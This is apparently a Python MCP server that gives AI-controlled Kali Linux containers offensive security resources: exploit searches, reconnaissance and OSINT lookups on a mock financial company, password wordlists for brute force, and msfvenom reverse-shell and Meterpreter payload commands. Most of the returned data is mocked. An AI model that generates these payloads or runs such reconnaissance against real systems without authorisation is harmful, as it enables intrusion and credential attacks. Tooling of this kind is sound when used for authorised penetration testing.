#!/usr/bin/env python3
"""
Kali Linux Offensive MCP Server
Provides external offensive security resources to AI-controlled Kali containers
"""

import asyncio
import json
import logging
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, asdict
import aiohttp
import os

@dataclass
class OffensiveResource:
    """External offensive security resource"""
    name: str
    type: str  # exploit_db, threat_intel, vuln_db, etc.
    url: str
    api_key: Optional[str] = None
    description: str = ""

class KaliOffensiveMCP:
    """MCP server providing offensive security resources to Kali containers"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        
        # External offensive security resources
        self.resources = {
            # Exploit Databases
            "exploit_db": OffensiveResource(
                name="Exploit Database",
                type="exploit_db",
                url="https://www.exploit-db.com/search",
                description="Searchable database of exploits and vulnerable software"
            ),
            
            # Vulnerability Intelligence
            "shodan": OffensiveResource(
                name="Shodan",
                type="network_intelligence",
                url="https://api.shodan.io",
                api_key=os.getenv('SHODAN_API_KEY'),
                description="Internet-connected device search engine"
            ),
            
            "censys": OffensiveResource(
                name="Censys",
                type="network_intelligence", 
                url="https://search.censys.io/api",
                api_key=os.getenv('CENSYS_API_KEY'),
                description="Internet asset discovery and reconnaissance"
            ),
            
            # Threat Intelligence
            "virustotal": OffensiveResource(
                name="VirusTotal",
                type="threat_intel",
                url="https://www.virustotal.com/vtapi/v2",
                api_key=os.getenv('VIRUSTOTAL_API_KEY'),
                description="File and URL analysis service"
            ),
            
            "alienvault": OffensiveResource(
                name="AlienVault OTX",
                type="threat_intel",
                url="https://otx.alienvault.com/api/v1",
                api_key=os.getenv('OTX_API_KEY'),
                description="Open threat intelligence platform"
            ),
            
            # OSINT Resources
            "hunter_io": OffensiveResource(
                name="Hunter.io",
                type="osint",
                url="https://api.hunter.io/v2",
                api_key=os.getenv('HUNTER_API_KEY'),
                description="Email finder and domain search"
            ),
            
            "haveibeenpwned": OffensiveResource(
                name="Have I Been Pwned",
                type="osint",
                url="https://haveibeenpwned.com/api/v3",
                api_key=os.getenv('HIBP_API_KEY'),
                description="Breach database for credential intelligence"
            ),
            
            # Vulnerability Databases
            "nvd": OffensiveResource(
                name="National Vulnerability Database", 
                type="vuln_db",
                url="https://services.nvd.nist.gov/rest/json",
                description="NIST vulnerability database"
            ),
            
            "mitre_cve": OffensiveResource(
                name="MITRE CVE",
                type="vuln_db", 
                url="https://cve.mitre.org/cgi-bin/cvekey.cgi",
                description="Common Vulnerabilities and Exposures database"
            ),
            
            # Payload Generation
            "msfvenom_templates": OffensiveResource(
                name="MSFVenom Payload Templates",
                type="payload_gen",
                url="https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/templates",
                description="Metasploit payload templates and encoders"
            ),
            
            # Wordlists and Dictionaries
            "seclists": OffensiveResource(
                name="SecLists",
                type="wordlists",
                url="https://github.com/danielmiessler/SecLists",
                description="Collection of security testing lists"
            ),
            
            "rockyou": OffensiveResource(
                name="RockYou Wordlist",
                type="wordlists", 
                url="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt",
                description="Popular password wordlist for brute force attacks"
            )
        }
    
    async def get_exploit_suggestions(self, software: str, version: str) -> List[Dict[str, Any]]:
        """Get exploit suggestions for specific software/version"""
        exploits = []
        
        try:
            # Search Exploit-DB
            search_query = f"{software} {version}"
            
            # Simulate exploit search (in real implementation, would query actual APIs)
            mock_exploits = [
                {
                    "id": "EDB-12345",
                    "title": f"{software} {version} Remote Code Execution",
                    "type": "remote",
                    "platform": "linux",
                    "date": "2024-01-15",
                    "author": "security_researcher",
                    "description": f"Buffer overflow vulnerability in {software} {version}",
                    "cvss": 9.8,
                    "verified": True
                },
                {
                    "id": "EDB-12346", 
                    "title": f"{software} {version} Local Privilege Escalation",
                    "type": "local",
                    "platform": "windows",
                    "date": "2024-01-10",
                    "author": "exploit_dev",
                    "description": f"Local privilege escalation in {software} {version}",
                    "cvss": 7.8,
                    "verified": False
                }
            ]
            
            exploits.extend(mock_exploits)
            
        except Exception as e:
            self.logger.error(f"Failed to fetch exploits: {e}")
        
        return exploits
    
    async def get_network_intelligence(self, target: str) -> Dict[str, Any]:
        """Get network intelligence from Shodan/Censys"""
        intelligence = {
            "target": target,
            "ports": [],
            "services": [],
            "vulnerabilities": [],
            "geolocation": {},
            "organization": ""
        }
        
        try:
            # Mock Shodan data (in real implementation, would query Shodan API)
            if self.resources["shodan"].api_key:
                intelligence.update({
                    "ports": [22, 80, 443, 3389],
                    "services": [
                        {"port": 22, "service": "SSH", "version": "OpenSSH 7.4"},
                        {"port": 80, "service": "HTTP", "version": "Apache 2.4.41"},
                        {"port": 443, "service": "HTTPS", "version": "Apache 2.4.41"},
                        {"port": 3389, "service": "RDP", "version": "Microsoft Terminal Services"}
                    ],
                    "vulnerabilities": [
                        {"cve": "CVE-2023-12345", "severity": "high", "service": "Apache"},
                        {"cve": "CVE-2023-12346", "severity": "medium", "service": "SSH"}
                    ],
                    "geolocation": {"country": "US", "city": "New York"},
                    "organization": "Acme Financial Corp"
                })
            
        except Exception as e:
            self.logger.error(f"Failed to fetch network intelligence: {e}")
        
        return intelligence
    
    async def get_osint_data(self, domain: str) -> Dict[str, Any]:
        """Get OSINT data for target domain"""
        osint = {
            "domain": domain,
            "emails": [],
            "subdomains": [],
            "breaches": [],
            "social_media": [],
            "employees": []
        }
        
        try:
            # Mock OSINT data (in real implementation, would query various APIs)
            osint.update({
                "emails": [
                    "admin@acmefinancial.local",
                    "ceo@acmefinancial.local", 
                    "finance@acmefinancial.local",
                    "hr@acmefinancial.local"
                ],
                "subdomains": [
                    "mail.acmefinancial.local",
                    "ftp.acmefinancial.local",
                    "intranet.acmefinancial.local",
                    "portal.acmefinancial.local"
                ],
                "breaches": [
                    {"breach": "Collection #1", "date": "2019-01-07", "emails": 2},
                    {"breach": "LinkedIn", "date": "2012-05-05", "emails": 1}
                ],
                "employees": [
                    {"name": "John Smith", "title": "CEO", "email": "ceo@acmefinancial.local"},
                    {"name": "Jane Doe", "title": "CFO", "email": "finance@acmefinancial.local"},
                    {"name": "Bob Johnson", "title": "CISO", "email": "security@acmefinancial.local"}
                ]
            })
            
        except Exception as e:
            self.logger.error(f"Failed to fetch OSINT data: {e}")
        
        return osint
    
    async def get_payload_templates(self, payload_type: str, target_os: str) -> List[Dict[str, Any]]:
        """Get payload templates for specific OS and type"""
        templates = []
        
        try:
            # Mock payload templates (in real implementation, would access MSF templates)
            if payload_type == "reverse_shell":
                templates.extend([
                    {
                        "name": f"linux/x64/shell_reverse_tcp",
                        "platform": "linux",
                        "arch": "x64",
                        "command": f"msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf",
                        "description": "Linux reverse shell payload"
                    },
                    {
                        "name": "windows/x64/shell_reverse_tcp",
                        "platform": "windows", 
                        "arch": "x64",
                        "command": f"msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe",
                        "description": "Windows reverse shell payload"
                    }
                ])
            
            elif payload_type == "meterpreter":
                templates.extend([
                    {
                        "name": "linux/x64/meterpreter/reverse_tcp",
                        "platform": "linux",
                        "arch": "x64", 
                        "command": f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf",
                        "description": "Linux Meterpreter reverse TCP payload"
                    }
                ])
            
        except Exception as e:
            self.logger.error(f"Failed to get payload templates: {e}")
        
        return templates
    
    async def get_wordlists(self, wordlist_type: str) -> List[Dict[str, Any]]:
        """Get appropriate wordlists for different attack types"""
        wordlists = []
        
        wordlist_categories = {
            "directories": [
                {"name": "common.txt", "url": "/usr/share/wordlists/dirb/common.txt", "size": "4614 entries"},
                {"name": "big.txt", "url": "/usr/share/wordlists/dirb/big.txt", "size": "20469 entries"}
            ],
            "passwords": [
                {"name": "rockyou.txt", "url": "/usr/share/wordlists/rockyou.txt", "size": "14344391 entries"},
                {"name": "top-passwords.txt", "url": "/usr/share/wordlists/fasttrack.txt", "size": "222 entries"}
            ],
            "usernames": [
                {"name": "names.txt", "url": "/usr/share/wordlists/metasploit/names.txt", "size": "1909 entries"},
                {"name": "unix_users.txt", "url": "/usr/share/wordlists/metasploit/unix_users.txt", "size": "168 entries"}
            ]
        }
        
        return wordlist_categories.get(wordlist_type, [])
    
    async def get_vulnerability_info(self, cve_id: str) -> Dict[str, Any]:
        """Get detailed vulnerability information"""
        vuln_info = {
            "cve_id": cve_id,
            "description": "",
            "cvss_score": 0.0,
            "severity": "",
            "published_date": "",
            "modified_date": "",
            "affected_products": [],
            "references": [],
            "exploits_available": False
        }
        
        try:
            # Mock vulnerability data (in real implementation, would query NVD API)
            vuln_info.update({
                "description": f"Buffer overflow vulnerability in enterprise software allowing remote code execution",
                "cvss_score": 9.8,
                "severity": "CRITICAL",
                "published_date": "2024-01-15",
                "modified_date": "2024-01-20",
                "affected_products": ["Enterprise Web Portal v2.1", "Legacy Financial App v1.0"],
                "references": [
                    "https://nvd.nist.gov/vuln/detail/" + cve_id,
                    "https://www.exploit-db.com/exploits/12345"
                ],
                "exploits_available": True
            })
            
        except Exception as e:
            self.logger.error(f"Failed to fetch vulnerability info: {e}")
        
        return vuln_info

# MCP Server Routes/Handlers
async def handle_kali_mcp_request(request_type: str, params: Dict[str, Any]) -> Dict[str, Any]:
    """Handle MCP requests from Kali containers"""
    mcp = KaliOffensiveMCP()
    
    try:
        if request_type == "get_exploits":
            software = params.get("software", "")
            version = params.get("version", "")
            return {"exploits": await mcp.get_exploit_suggestions(software, version)}
        
        elif request_type == "get_network_intel":
            target = params.get("target", "")
            return {"intelligence": await mcp.get_network_intelligence(target)}
        
        elif request_type == "get_osint":
            domain = params.get("domain", "")
            return {"osint": await mcp.get_osint_data(domain)}
        
        elif request_type == "get_payloads":
            payload_type = params.get("type", "reverse_shell")
            target_os = params.get("os", "linux")
            return {"templates": await mcp.get_payload_templates(payload_type, target_os)}
        
        elif request_type == "get_wordlists":
            wordlist_type = params.get("type", "directories")
            return {"wordlists": await mcp.get_wordlists(wordlist_type)}
        
        elif request_type == "get_vuln_info":
            cve_id = params.get("cve_id", "")
            return {"vulnerability": await mcp.get_vulnerability_info(cve_id)}
        
        else:
            return {"error": f"Unknown request type: {request_type}"}
    
    except Exception as e:
        return {"error": str(e)}

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    print("🔴 Kali Linux Offensive MCP Server")
    print("🎯 Providing external offensive security resources")
    print("🔧 Available resources:")
    
    mcp = KaliOffensiveMCP()
    for name, resource in mcp.resources.items():
        status = "✅" if resource.api_key or not resource.api_key else "⚠️"
        print(f"   {status} {resource.name} ({resource.type})")
    
    print("\n🚀 MCP Server ready for Kali container requests")